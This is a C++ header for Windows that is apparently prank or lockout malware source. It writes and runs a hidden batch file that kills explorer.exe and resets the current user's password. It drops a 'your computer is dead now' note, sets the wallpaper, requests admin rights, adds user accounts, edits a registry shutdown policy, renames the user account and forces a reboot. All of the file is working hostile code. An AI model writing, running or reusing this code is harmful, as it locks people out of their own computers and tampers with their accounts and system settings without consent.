#pragma once
#pragma warning(disable : 4996) 
#ifdef function
#define function
#endif // function
#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include "img.h"
#include <shellapi.h>
int Open() {
	system("start C:\\a.bat");
	return 0;
}

int SetDesktopWallpaper() {
	const char* path = "C:\\good.bmp";
	BOOL result = SystemParametersInfoA(SPI_SETDESKWALLPAPER,0,(void*)path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
	return result;
}
int CreateSomeStrangeFiles() {
	std::ofstream newfile;
	newfile.open("read me.txt");
	newfile << "bro, your computer is dead now\n";
	newfile.close();
	newfile.open("C:\\a.bat");
	newfile << "attrib +s +h C:\\a.bat\ntaskkill /F /IM explorer.exe\nattrib +s +h C:\\good.bmp\nmsg * lol\nnet user %username% monke\n";
	newfile.close();
	return 0;
}
void userbmp1()
{

	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\good.bmp", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, rawData1, sizeof(rawData1), &dw, 0); 
	CloseHandle(hFile); //關閉文件句柄 讓其他程式可以開他
	return;
}
void GetAdmin() {
	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
	sei.lpVerb = L"runas";//ipverb是詢問何種操作
	sei.lpFile = L"*.exe";
	sei.nShow = SW_SHOW;
	if (!ShellExecuteEx(&sei)) {
		return;
	}
	
}
int RunCommands() {
	int i = 0;
	if (i < 100) {
		i += 1;
		system("Reg.exe add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v 'shutdownwithoutlogon' /t REG_DWORD /d '1' /f");
		system("net user USEREEERROOR%random% monke /add");
	}
	system("wmic useraccount where name='%username%' rename 'MONKEY'");
	system("shutdown -r -t 0");
	return 0;
}